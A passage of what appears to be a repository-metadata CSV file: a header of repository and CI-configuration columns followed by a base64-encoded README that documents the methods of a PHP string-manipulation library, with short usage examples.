name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
Ym9vbGVhbiAkY2FzZVNlbnNpdGl2ZSA9IHRydWUgXSkKClJldHVybnMgdHJ1
ZSBpZiB0aGUgc3RyaW5nIGNvbnRhaW5zICRuZWVkbGUsIGZhbHNlIG90aGVy
d2lzZS4gQnkgZGVmYXVsdCwKdGhlIGNvbXBhcmlzb24gaXMgY2FzZS1zZW5z
aXRpdmUsIGJ1dCBjYW4gYmUgbWFkZSBpbnNlbnNpdGl2ZQpieSBzZXR0aW5n
ICRjYXNlU2Vuc2l0aXZlIHRvIGZhbHNlLgoKYGBgcGhwCnMoJ86fIM+Dz4XO
s86zz4HOsc+Gzq3Osc+CIM61zq/PgM61JyktPmNvbnRhaW5zKCfPg8+FzrPO
s8+BzrHPhs6tzrHPgicpOyAvLyB0cnVlCmBgYAoKIyMjIyMgY29udGFpbnNB
bGwoYXJyYXkgJG5lZWRsZXMgWywgYm9vbGVhbiAkY2FzZVNlbnNpdGl2ZSA9
IHRydWUgXSkKClJldHVybnMgdHJ1ZSBpZiB0aGUgc3RyaW5nIGNvbnRhaW5z
IGFsbCAkbmVlZGxlcywgZmFsc2Ugb3RoZXJ3aXNlLiBCeQpkZWZhdWx0IHRo
ZSBjb21wYXJpc29uIGlzIGNhc2Utc2Vuc2l0aXZlLCBidXQgY2FuIGJlIG1h
ZGUgaW5zZW5zaXRpdmUgYnkKc2V0dGluZyAkY2FzZVNlbnNpdGl2ZSB0byBm
YWxzZS4KCmBgYHBocApzKCdmb28gJiBiYXInKS0+Y29udGFpbnNBbGwoWydm
b28nLCAnYmFyJ10pOyAvLyB0cnVlCmBgYAoKIyMjIyMgY29udGFpbnNBbnko
YXJyYXkgJG5lZWRsZXMgWywgYm9vbGVhbiAkY2FzZVNlbnNpdGl2ZSA9IHRy
dWUgXSkKClJldHVybnMgdHJ1ZSBpZiB0aGUgc3RyaW5nIGNvbnRhaW5zIGFu
eSAkbmVlZGxlcywgZmFsc2Ugb3RoZXJ3aXNlLiBCeQpkZWZhdWx0IHRoZSBj
b21wYXJpc29uIGlzIGNhc2Utc2Vuc2l0aXZlLCBidXQgY2FuIGJlIG1hZGUg
aW5zZW5zaXRpdmUgYnkKc2V0dGluZyAkY2FzZVNlbnNpdGl2ZSB0byBmYWxz
ZS4KCmBgYHBocApzKCdzdHIgY29udGFpbnMgZm9vJyktPmNvbnRhaW5zQW55
KFsnZm9vJywgJ2JhciddKTsgLy8gdHJ1ZQpgYGAKCiMjIyMjIGNvdW50U3Vi
c3RyKHN0cmluZyAkc3Vic3RyaW5nIFssIGJvb2xlYW4gJGNhc2VTZW5zaXRp
dmUgPSB0cnVlIF0pCgpSZXR1cm5zIHRoZSBudW1iZXIgb2Ygb2NjdXJyZW5j
ZXMgb2YgJHN1YnN0cmluZyBpbiB0aGUgZ2l2ZW4gc3RyaW5nLgpCeSBkZWZh
dWx0LCB0aGUgY29tcGFyaXNvbiBpcyBjYXNlLXNlbnNpdGl2ZSwgYnV0IGNh
biBiZSBtYWRlIGluc2Vuc2l0aXZlCmJ5IHNldHRpbmcgJGNhc2VTZW5zaXRp
dmUgdG8gZmFsc2UuCgpgYGBwaHAKcygnzp8gz4PPhc6zzrPPgc6xz4bOrc6x
z4IgzrXOr8+AzrUnKS0+Y291bnRTdWJzdHIoJ86xJyk7IC8vIDIKYGBgCgoj
IyMjIyBkYXNoZXJpemUoKQoKUmV0dXJucyBhIGxvd2VyY2FzZSBhbmQgdHJp
bW1lZCBzdHJpbmcgc2VwYXJhdGVkIGJ5IGRhc2hlcy4gRGFzaGVzIGFyZQpp
bnNlcnRlZCBiZWZvcmUgdXBwZXJjYXNlIGNoYXJhY3RlcnMgKHdpdGggdGhl
IGV4Y2VwdGlvbiBvZiB0aGUgZmlyc3QKY2hhcmFjdGVyIG9mIHRoZSBzdHJp
bmcpLCBhbmQgaW4gcGxhY2Ugb2Ygc3BhY2VzIGFzIHdlbGwgYXMgdW5kZXJz
Y29yZXMuCgpgYGBwaHAKcygnZm9vQmFyJyktPmRhc2hlcml6ZSgpOyAvLyAn
Zm9vLWJhcicKYGBgCgojIyMjIyBkZWxpbWl0KGludCAkZGVsaW1pdGVyKQoK
UmV0dXJucyBhIGxvd2VyY2FzZSBhbmQgdHJpbW1lZCBzdHJpbmcgc2VwYXJh
dGVkIGJ5IHRoZSBnaXZlbiBkZWxpbWl0ZXIuCkRlbGltaXRlcnMgYXJlIGlu
c2VydGVkIGJlZm9yZSB1cHBlcmNhc2UgY2hhcmFjdGVycyAod2l0aCB0aGUg
ZXhjZXB0aW9uCm9mIHRoZSBmaXJzdCBjaGFyYWN0ZXIgb2YgdGhlIHN0cmlu
ZyksIGFuZCBpbiBwbGFjZSBvZiBzcGFjZXMsIGRhc2hlcywKYW5kIHVuZGVy
c2NvcmVzLiBBbHBoYSBkZWxpbWl0ZXJzIGFyZSBub3QgY29udmVydGVkIHRv
IGxvd2VyY2FzZS4KCmBgYHBocApzKCdmb29CYXInKS0+ZGVsaW1pdCgnOjon
KTsgLy8gJ2Zvbzo6YmFyJwpgYGAKCiMjIyMjIGVuZHNXaXRoKHN0cmluZyAk
c3Vic3RyaW5nIFssIGJvb2xlYW4gJGNhc2VTZW5zaXRpdmUgPSB0cnVlIF0p
CgpSZXR1cm5zIHRydWUgaWYgdGhlIHN0cmluZyBlbmRzIHdpdGggJHN1YnN0
cmluZywgZmFsc2Ugb3RoZXJ3aXNlLiBCeQpkZWZhdWx0LCB0aGUgY29tcGFy
aXNvbiBpcyBjYXNlLXNlbnNpdGl2ZSwgYnV0IGNhbiBiZSBtYWRlIGluc2Vu
c2l0aXZlIGJ5CnNldHRpbmcgJGNhc2VTZW5zaXRpdmUgdG8gZmFsc2UuCgpg
YGBwaHAKcygnZsOyw7Riw6DFmScpLT5lbmRzV2l0aCgnYsOgxZknKTsgLy8g
dHJ1ZQpgYGAKCiMjIyMjIGVuZHNXaXRoQW55KHN0cmluZ1tdICRzdWJzdHJp
bmdzIFssIGJvb2xlYW4gJGNhc2VTZW5zaXRpdmUgPSB0cnVlIF0pCgpSZXR1
cm5zIHRydWUgaWYgdGhlIHN0cmluZyBlbmRzIHdpdGggYW55IG9mICRzdWJz
dHJpbmdzLCBmYWxzZSBvdGhlcndpc2UuCkJ5IGRlZmF1bHQsIHRoZSBjb21w
YXJpc29uIGlzIGNhc2Utc2Vuc2l0aXZlLCBidXQgY2FuIGJlIG1hZGUgaW5z
ZW5zaXRpdmUKYnkgc2V0dGluZyAkY2FzZVNlbnNpdGl2ZSB0byBmYWxzZS4K
CmBgYHBocApzKCdmw7LDtGLDoMWZJyktPmVuZHNXaXRoQW55KFsnYsOgxZkn
LCAnYmF6J10pOyAvLyB0cnVlCmBgYAoKIyMjIyMgZW5zdXJlTGVmdChzdHJp
bmcgJHN1YnN0cmluZykKCkVuc3VyZXMgdGhhdCB0aGUgc3RyaW5nIGJlZ2lu
cyB3aXRoICRzdWJzdHJpbmcuIElmIGl0IGRvZXNuJ3QsIGl0J3MgcHJlcGVu
ZGVkLgoKYGBgcGhwCnMoJ2Zvb2JhcicpLT5lbnN1cmVMZWZ0KCdodHRwOi8v
Jyk7IC8vICdodHRwOi8vZm9vYmFyJwpgYGAKCiMjIyMjIGVuc3VyZVJpZ2h0
KHN0cmluZyAkc3Vic3RyaW5nKQoKRW5zdXJlcyB0aGF0IHRoZSBzdHJpbmcg
ZW5kcyB3aXRoICRzdWJzdHJpbmcuIElmIGl0IGRvZXNuJ3QsIGl0J3MgYXBw
ZW5kZWQuCgpgYGBwaHAKcygnZm9vYmFyJyktPmVuc3VyZVJpZ2h0KCcuY29t
Jyk7IC8vICdmb29iYXIuY29tJwpgYGAKCiMjIyMjIGZpcnN0KGludCAkbikK
ClJldHVybnMgdGhlIGZpcnN0ICRuIGNoYXJhY3RlcnMgb2YgdGhlIHN0cmlu
Zy4KCmBgYHBocApzKCdmw7LDtGLDoMWZJyktPmZpcnN0KDMpOyAvLyAnZsOy
w7QnCmBgYAoKIyMjIyMgZ2V0RW5jb2RpbmcoKQoKUmV0dXJucyB0aGUgZW5j
b2RpbmcgdXNlZCBieSB0aGUgU3RyaW5neSBvYmplY3QuCgpgYGBwaHAKcygn
ZsOyw7Riw6DFmScpLT5nZXRFbmNvZGluZygpOyAvLyAnVVRGLTgnCmBgYAoK
IyMjIyMgaGFzTG93ZXJDYXNlKCkKClJldHVybnMgdHJ1ZSBpZiB0aGUgc3Ry
aW5nIGNvbnRhaW5zIGEgbG93ZXIgY2FzZSBjaGFyLCBmYWxzZSBvdGhlcndp
c2UuCgpgYGBwaHAKcygnZsOyw7Riw6DFmScpLT5oYXNMb3dlckNhc2UoKTsg
Ly8gdHJ1ZQpgYGAKCiMjIyMjIGhhc1VwcGVyQ2FzZSgpCgpSZXR1cm5zIHRy
dWUgaWYgdGhlIHN0cmluZyBjb250YWlucyBhbiB1cHBlciBjYXNlIGNoYXIs
IGZhbHNlIG90aGVyd2lzZS4KCmBgYHBocApzKCdmw7LDtGLDoMWZJyktPmhh
c1VwcGVyQ2FzZSgpOyAvLyBmYWxzZQpgYGAKCiMjIyMjIGh0bWxEZWNvZGUo
KQoKQ29udmVydCBhbGwgSFRNTCBlbnRpdGllcyB0byB0aGVpciBhcHBsaWNh
YmxlIGNoYXJhY3RlcnMuIEFuIGFsaWFzIG9mCmh0bWxfZW50aXR5X2RlY29k
ZS4gRm9yIGEgbGlzdCBvZiBmbGFncywgcmVmZXIgdG8KaHR0cDovL3BocC5u
ZXQvbWFudWFsL2VuL2Z1bmN0aW9uLmh0bWwtZW50aXR5LWRlY29kZS5waHAK
CmBgYHBocApzKCcmYW1wOycpLT5odG1sRGVjb2RlKCk7IC8vICcmJwpgYGAK
CiMjIyMjIGh0bWxFbmNvZGUoKQoKQ29udmVydCBhbGwgYXBwbGljYWJsZSBj
aGFyYWN0ZXJzIHRvIEhUTUwgZW50aXRpZXMuIEFuIGFsaWFzIG9mCmh0bWxl
bnRpdGllcy4gUmVmZXIgdG8gaHR0cDovL3BocC5uZXQvbWFudWFsL2VuL2Z1
bmN0aW9uLmh0bWxlbnRpdGllcy5waHAKZm9yIGEgbGlzdCBvZiBmbGFncy4K
CmBgYHBocApzKCcmJyktPmh0bWxFbmNvZGUoKTsgLy8gJyZhbXA7JwpgYGAK
CiMjIyMjIGh1bWFuaXplKCkKCkNhcGl0YWxpemVzIHRoZSBmaXJzdCB3b3Jk
IG9mIHRoZSBzdHJpbmcsIHJlcGxhY2VzIHVuZGVyc2NvcmVzIHdpdGgKc3Bh
Y2VzLCBhbmQgc3RyaXBzICdfaWQnLgoKYGBgcGhwCnMoJ2F1dGhvcl9pZCcp
LT5odW1hbml6ZSgpOyAvLyAnQXV0aG9yJwpgYGAKCiMjIyMjIGluZGV4T2Yo
c3RyaW5nICRuZWVkbGUgWywgJG9mZnNldCA9IDAgXSk7CgpSZXR1cm5zIHRo
ZSBpbmRleCBvZiB0aGUgZmlyc3Qgb2NjdXJyZW5jZSBvZiAkbmVlZGxlIGlu
IHRoZSBzdHJpbmcsCmFuZCBmYWxzZSBpZiBub3QgZm91bmQuIEFjY2VwdHMg
YW4gb3B0aW9uYWwgb2Zmc2V0IGZyb20gd2hpY2ggdG8gYmVnaW4KdGhlIHNl
YXJjaC4gQSBuZWdhdGl2ZSBpbmRleCBzZWFyY2hlcyBmcm9tIHRoZSBlbmQK
CmBgYHBocApzKCdzdHJpbmcnKS0+aW5kZXhPZignaW5nJyk7IC8vIDMKYGBg
CgojIyMjIyBpbmRleE9mTGFzdChzdHJpbmcgJG5lZWRsZSBbLCAkb2Zmc2V0
ID0gMCBdKTsKClJldHVybnMgdGhlIGluZGV4IG9mIHRoZSBsYXN0IG9jY3Vy
cmVuY2Ugb2YgJG5lZWRsZSBpbiB0aGUgc3RyaW5nLAphbmQgZmFsc2UgaWYg
bm90IGZvdW5kLiBBY2NlcHRzIGFuIG9wdGlvbmFsIG9mZnNldCBmcm9tIHdo
aWNoIHRvIGJlZ2luCnRoZSBzZWFyY2guIE9mZnNldHMgbWF5IGJlIG5lZ2F0
aXZlIHRvIGNvdW50IGZyb20gdGhlIGxhc3QgY2hhcmFjdGVyCmluIHRoZSBz
dHJpbmcuCgpgYGBwaHAKcygnZm9vYmFyZm9vJyktPmluZGV4T2ZMYXN0KCdm
b28nKTsgLy8gMTAKYGBgCgojIyMjIyBpbnNlcnQoaW50ICRpbmRleCwgc3Ry
aW5nICRzdWJzdHJpbmcpCgpJbnNlcnRzICRzdWJzdHJpbmcgaW50byB0aGUg
c3RyaW5nIGF0IHRoZSAkaW5kZXggcHJvdmlkZWQuCgpgYGBwaHAKcygnZsOy
w7RixZknKS0+aW5zZXJ0KCfDoCcsIDQpOyAvLyAnZsOyw7Riw6DFmScKYGBg
CgojIyMjIyBpc0FscGhhKCkKClJldHVybnMgdHJ1ZSBpZiB0aGUgc3RyaW5n
IGNvbnRhaW5zIG9ubHkgYWxwaGFiZXRpYyBjaGFycywgZmFsc2Ugb3RoZXJ3
aXNlLgoKYGBgcGhwCnMoJ+S4ueWwvOeIvicpLT5pc0FscGhhKCk7IC8vIHRy
dWUKYGBgCgojIyMjIyBpc0FscGhhbnVtZXJpYygpCgpSZXR1cm5zIHRydWUg
aWYgdGhlIHN0cmluZyBjb250YWlucyBvbmx5IGFscGhhYmV0aWMgYW5kIG51
bWVyaWMgY2hhcnMsIGZhbHNlCm90aGVyd2lzZS4KCmBgYHBocApzKCfYr9in
2YbZitin2YQxJyktPmlzQWxwaGFudW1lcmljKCk7IC8vIHRydWUKYGBgCgoj
IyMjIyBpc0Jhc2U2NCgpCgpSZXR1cm5zIHRydWUgaWYgdGhlIHN0cmluZyBp
cyBiYXNlNjQgZW5jb2RlZCwgZmFsc2Ugb3RoZXJ3aXNlLgoKYGBgcGhwCnMo
J1ptOXZZbUZ5JyktPmlzQmFzZTY0KCk7IC8vIHRydWUKYGBgCgojIyMjIyBp
c0JsYW5rKCkKClJldHVybnMgdHJ1ZSBpZiB0aGUgc3RyaW5nIGNvbnRhaW5z
IG9ubHkgd2hpdGVzcGFjZSBjaGFycywgZmFsc2Ugb3RoZXJ3aXNlLgoKYGBg
cGhwCnMoIlxuXHQgIFx2XGYiKS0+aXNCbGFuaygpOyAvLyB0cnVlCmBgYAoK
IyMjIyMgaXNIZXhhZGVjaW1hbCgpCgpSZXR1cm5zIHRydWUgaWYgdGhlIHN0
cmluZyBjb250YWlucyBvbmx5IGhleGFkZWNpbWFsIGNoYXJzLCBmYWxzZSBv
dGhlcndpc2UuCgpgYGBwaHAKcygnQTEwMkYnKS0+aXNIZXhhZGVjaW1hbCgp
OyAvLyB0cnVlCmBgYAoKIyMjIyMgaXNKc29uKCkKClJldHVybnMgdHJ1ZSBp
ZiB0aGUgc3RyaW5nIGlzIEpTT04sIGZhbHNlIG90aGVyd2lzZS4gVW5saWtl
IGpzb25fZGVjb2RlCmluIFBIUCA1LngsIHRoaXMgbWV0aG9kIGlzIGNvbnNp
c3RlbnQgd2l0aCBQSFAgNyBhbmQgb3RoZXIgSlNPTiBwYXJzZXJzLAppbiB0
aGF0IGFuIGVtcHR5IHN0cmluZyBpcyBub3QgY29uc2lkZXJlZCB2YWxpZCBK
U09OLgoKYGBgcGhwCnMoJ3siZm9vIjoiYmFyIn0nKS0+aXNKc29uKCk7IC8v
IHRydWUKYGBgCgojIyMjIyBpc0xvd2VyQ2FzZSgpCgpSZXR1cm5zIHRydWUg
aWYgdGhlIHN0cmluZyBjb250YWlucyBvbmx5IGxvd2VyIGNhc2UgY2hhcnMs
IGZhbHNlIG90aGVyd2lzZS4KCmBgYHBocApzKCdmw7LDtGLDoMWZJyktPmlz
TG93ZXJDYXNlKCk7IC8vIHRydWUKYGBgCgojIyMjIyBpc1NlcmlhbGl6ZWQo
KQoKUmV0dXJucyB0cnVlIGlmIHRoZSBzdHJpbmcgaXMgc2VyaWFsaXplZCwg
ZmFsc2Ugb3RoZXJ3aXNlLgoKYGBgcGhwCnMoJ2E6MTp7czozOiJmb28iO3M6
MzoiYmFyIjt9JyktPmlzU2VyaWFsaXplZCgpOyAvLyB0cnVlCmBgYAoKIyMj
IyMgaXNVcHBlckNhc2UoKQoKUmV0dXJucyB0cnVlIGlmIHRoZSBzdHJpbmcg
Y29udGFpbnMgb25seSB1cHBlciBjYXNlIGNoYXJzLCBmYWxzZSBvdGhlcndp
c2UuCgpgYGBwaHAKcygnRsOSw5RCw4DFmCcpLT5pc1VwcGVyQ2FzZSgpOyAv
LyB0cnVlCmBgYAoKIyMjIyMgbGFzdChpbnQgJG4pCgpSZXR1cm5zIHRoZSBs
YXN0ICRuIGNoYXJhY3RlcnMgb2YgdGhlIHN0cmluZy4KCmBgYHBocApzKCdm
w7LDtGLDoMWZJyktPmxhc3QoMyk7IC8vICdiw6DFmScKYGBgCgojIyMjIyBs
ZW5ndGgoKQoKUmV0dXJucyB0aGUgbGVuZ3RoIG9mIHRoZSBzdHJpbmcuIEFu
IGFsaWFzIGZvciBQSFAncyBtYl9zdHJsZW4oKSBmdW5jdGlvbi4KCmBgYHBo
cApzKCdmw7LDtGLDoMWZJyktPmxlbmd0aCgpOyAvLyA2CmBgYAoKIyMjIyMg
bGluZXMoKQoKU3BsaXRzIG9uIG5ld2xpbmVzIGFuZCBjYXJyaWFnZSByZXR1
cm5zLCByZXR1cm5pbmcgYW4gYXJyYXkgb2YgU3RyaW5neQpvYmplY3RzIGNv
cnJlc3BvbmRpbmcgdG8gdGhlIGxpbmVzIGluIHRoZSBzdHJpbmcuCgpgYGBw
aHAKcygiZsOyw7RcclxuYsOgxZlcbiIpLT5saW5lcygpOyAvLyBbJ2bDssO0
JywgJ2LDoMWZJywgJyddCmBgYAoKIyMjIyMgbG9uZ2VzdENvbW1vblByZWZp
eChzdHJpbmcgJG90aGVyU3RyKQoKUmV0dXJucyB0aGUgbG9uZ2VzdCBjb21t
b24gcHJlZml4IGJldHdlZW4gdGhlIHN0cmluZyBhbmQgJG90aGVyU3RyLgoK
YGBgcGhwCnMoJ2Zvb2JhcicpLT5sb25nZXN0Q29tbW9uUHJlZml4KCdmb29i
YXonKTsgLy8gJ2Zvb2JhJwpgYGAKCiMjIyMjIGxvbmdlc3RDb21tb25TdWZm
aXgoc3RyaW5nICRvdGhlclN0cikKClJldHVybnMgdGhlIGxvbmdlc3QgY29t
bW9uIHN1ZmZpeCBiZXR3ZWVuIHRoZSBzdHJpbmcgYW5kICRvdGhlclN0ci4K
CmBgYHBocApzKCdmw7LDtGLDoMWZJyktPmxvbmdlc3RDb21tb25TdWZmaXgo
J2bDsnJiw6DFmScpOyAvLyAnYsOgxZknCmBgYAoKIyMjIyMgbG9uZ2VzdENv
bW1vblN1YnN0cmluZyhzdHJpbmcgJG90aGVyU3RyKQoKUmV0dXJucyB0aGUg
bG9uZ2VzdCBjb21tb24gc3Vic3RyaW5nIGJldHdlZW4gdGhlIHN0cmluZyBh
bmQgJG90aGVyU3RyLiBJbiB0aGUKY2FzZSBvZiB0aWVzLCBpdCByZXR1cm5z
IHRoYXQgd2hpY2ggb2NjdXJzIGZpcnN0LgoKYGBgcGhwCnMoJ2Zvb2Jhcicp
LT5sb25nZXN0Q29tbW9uU3Vic3RyaW5nKCdib29mYXInKTsgLy8gJ29vJwpg
YGAKCiMjIyMjIGxvd2VyQ2FzZUZpcnN0KCkKCkNvbnZlcnRzIHRoZSBmaXJz
dCBjaGFyYWN0ZXIgb2YgdGhlIHN1cHBsaWVkIHN0cmluZyB0byBsb3dlciBj
YXNlLgoKYGBgcGhwCnMoJ86jIGZvbycpLT5sb3dlckNhc2VGaXJzdCgpOyAv
LyAnz4MgZm9vJwpgYGAKCiMjIyMjIHBhZChpbnQgJGxlbmd0aCBbLCBzdHJp
bmcgJHBhZFN0ciA9ICcgJyBbLCBzdHJpbmcgJHBhZFR5cGUgPSAncmlnaHQn
IF1dKQoKUGFkcyB0aGUgc3RyaW5nIHRvIGEgZ2l2ZW4gbGVuZ3RoIHdpdGgg
JHBhZFN0ci4gSWYgbGVuZ3RoIGlzIGxlc3MgdGhhbgpvciBlcXVhbCB0byB0
aGUgbGVuZ3RoIG9mIHRoZSBzdHJpbmcsIG5vIHBhZGRpbmcgdGFrZXMgcGxh
Y2VzLiBUaGUgZGVmYXVsdApzdHJpbmcgdXNlZCBmb3IgcGFkZGluZyBpcyBh
IHNwYWNlLCBhbmQgdGhlIGRlZmF1bHQgdHlwZSAob25lIG9mICdsZWZ0JywK
J3JpZ2h0JywgJ2JvdGgnKSBpcyAncmlnaHQnLiBUaHJvd3MgYW4gSW52YWxp
ZEFyZ3VtZW50RXhjZXB0aW9uIGlmCiRwYWRUeXBlIGlzbid0IG9uZSBvZiB0
aG9zZSAzIHZhbHVlcy4KCmBgYHBocApzKCdmw7LDtGLDoMWZJyktPnBhZCg5
LCAnLS8nLCAnbGVmdCcpOyAvLyAnLS8tZsOyw7Riw6DFmScKYGBgCgojIyMj
IyBwYWRCb3RoKGludCAkbGVuZ3RoIFssIHN0cmluZyAkcGFkU3RyID0gJyAn
IF0pCgpSZXR1cm5zIGEgbmV3IHN0cmluZyBvZiBhIGdpdmVuIGxlbmd0aCBz
dWNoIHRoYXQgYm90aCBzaWRlcyBvZiB0aGUgc3RyaW5nCnN0cmluZyBhcmUg
cGFkZGVkLiBBbGlhcyBmb3IgcGFkKCkgd2l0aCBhICRwYWRUeXBlIG9mICdi
b3RoJy4KCmBgYHBocApzKCdmb28gYmFyJyktPnBhZEJvdGgoOSwgJyAnKTsg
Ly8gJyBmb28gYmFyICcKYGBgCgojIyMjIyBwYWRMZWZ0KGludCAkbGVuZ3Ro
IFssIHN0cmluZyAkcGFkU3RyID0gJyAnIF0pCgpSZXR1cm5zIGEgbmV3IHN0
cmluZyBvZiBhIGdpdmVuIGxlbmd0aCBzdWNoIHRoYXQgdGhlIGJlZ2lubmlu
ZyBvZiB0aGUKc3RyaW5nIGlzIHBhZGRlZC4gQWxpYXMgZm9yIHBhZCgpIHdp
dGggYSAkcGFkVHlwZSBvZiAnbGVmdCcuCgpgYGBwaHAKcygnZm9vIGJhcicp
LT5wYWRMZWZ0KDksICcgJyk7IC8vICcgIGZvbyBiYXInCmBgYAoKIyMjIyMg
cGFkUmlnaHQoaW50ICRsZW5ndGggWywgc3RyaW5nICRwYWRTdHIgPSAnICcg
XSkKClJldHVybnMgYSBuZXcgc3RyaW5nIG9mIGEgZ2l2ZW4gbGVuZ3RoIHN1
Y2ggdGhhdCB0aGUgZW5kIG9mIHRoZSBzdHJpbmcgaXMKcGFkZGVkLiBBbGlh
cyBmb3IgcGFkKCkgd2l0aCBhICRwYWRUeXBlIG9mICdyaWdodCcuCgpgYGBw
aHAKcygnZm9vIGJhcicpLT5wYWRSaWdodCgxMCwgJ18qJyk7IC8vICdmb28g
YmFyXypfJwpgYGAKCiMjIyMjIHByZXBlbmQoc3RyaW5nICRzdHJpbmcpCgpS
ZXR1cm5zIGEgbmV3IHN0cmluZyBzdGFydGluZyB3aXRoICRzdHJpbmcuCgpg
YGBwaHAKcygnYsOgxZknKS0+cHJlcGVuZCgnZsOyw7QnKTsgLy8gJ2bDssO0
YsOgxZknCmBgYAoKIyMjIyMgcmVnZXhSZXBsYWNlKHN0cmluZyAkcGF0dGVy
biwgc3RyaW5nICRyZXBsYWNlbWVudCBbLCBzdHJpbmcgJG9wdGlvbnMgPSAn
bXNyJ10pCgpSZXBsYWNlcyBhbGwgb2NjdXJyZW5jZXMgb2YgJHBhdHRlcm4g
aW4gJHN0ciBieSAkcmVwbGFjZW1lbnQuIEFuIGFsaWFzCmZvciBtYl9lcmVn
X3JlcGxhY2UoKS4gTm90ZSB0aGF0IHRoZSAnaScgb3B0aW9uIHdpdGggbXVs
dGlieXRlIHBhdHRlcm5zCmluIG1iX2VyZWdfcmVwbGFjZSgpIHJlcXVpcmVz
IFBIUCA1LjYrIGZvciBjb3JyZWN0IHJlc3VsdHMuIFRoaXMgaXMgZHVlCnRv
IGEgbGFjayBvZiBzdXBwb3J0IGluIHRoZSBidW5kbGVkIHZlcnNpb24gb2Yg
T25pZ3VydW1hIGluIFBIUCA8IDUuNiwKYW5kIGN1cnJlbnQgdmVyc2lvbnMg
b2YgSEhWTSAoMy44IGFuZCBiZWxvdykuCgpgYGBwaHAKcygnZsOyw7QgJykt
PnJlZ2V4UmVwbGFjZSgnZlvDssO0XStccycsICdiw6DFmScpOyAvLyAnYsOg
xZknCnMoJ2bDsicpLT5yZWdleFJlcGxhY2UoJyjDsiknLCAnXFwxw7QnKTsg
Ly8gJ2bDssO0JwpgYGAKCiMjIyMjIHJlbW92ZUxlZnQoc3RyaW5nICRzdWJz
dHJpbmcpCgpSZXR1cm5zIGEgbmV3IHN0cmluZyB3aXRoIHRoZSBwcmVmaXgg
JHN1YnN0cmluZyByZW1vdmVkLCBpZiBwcmVzZW50LgoKYGBgcGhwCnMoJ2bD
ssO0YsOgxZknKS0+cmVtb3ZlTGVmdCgnZsOyw7QnKTsgLy8gJ2LDoMWZJwpg
YGAKCiMjIyMjIHJlbW92ZVJpZ2h0KHN0cmluZyAkc3Vic3RyaW5nKQoKUmV0
dXJucyBhIG5ldyBzdHJpbmcgd2l0aCB0aGUgc3VmZml4ICRzdWJzdHJpbmcg
cmVtb3ZlZCwgaWYgcHJlc2VudC4KCmBgYHBocApzKCdmw7LDtGLDoMWZJykt
PnJlbW92ZVJpZ2h0KCdiw6DFmScpOyAvLyAnZsOyw7QnCmBgYAoKIyMjIyMg
cmVwZWF0KGludCAkbXVsdGlwbGllcikKClJldHVybnMgYSByZXBlYXRlZCBz
dHJpbmcgZ2l2ZW4gYSBtdWx0aXBsaWVyLiBBbiBhbGlhcyBmb3Igc3RyX3Jl
cGVhdC4KCmBgYHBocApzKCfOsScpLT5yZXBlYXQoMyk7IC8vICfOsc6xzrEn
CmBgYAoKIyMjIyMgcmVwbGFjZShzdHJpbmcgJHNlYXJjaCwgc3RyaW5nICRy
ZXBsYWNlbWVudCkKClJlcGxhY2VzIGFsbCBvY2N1cnJlbmNlcyBvZiAkc2Vh
cmNoIGluICRzdHIgYnkgJHJlcGxhY2VtZW50LgoKYGBgcGhwCnMoJ2bDssO0
IGLDoMWZIGbDssO0IGLDoMWZJyktPnJlcGxhY2UoJ2bDssO0ICcsICcnKTsg
Ly8gJ2LDoMWZIGLDoMWZJwpgYGAKCiMjIyMjIHJldmVyc2UoKQoKUmV0dXJu
cyBhIHJldmVyc2VkIHN0cmluZy4gQSBtdWx0aWJ5dGUgdmVyc2lvbiBvZiBz
dHJyZXYoKS4KCmBgYHBocApzKCdmw7LDtGLDoMWZJyktPnJldmVyc2UoKTsg
Ly8gJ8WZw6Biw7TDsmYnCmBgYAoKIyMjIyMgc2FmZVRydW5jYXRlKGludCAk
bGVuZ3RoIFssIHN0cmluZyAkc3Vic3RyaW5nID0gJycgXSkKClRydW5jYXRl
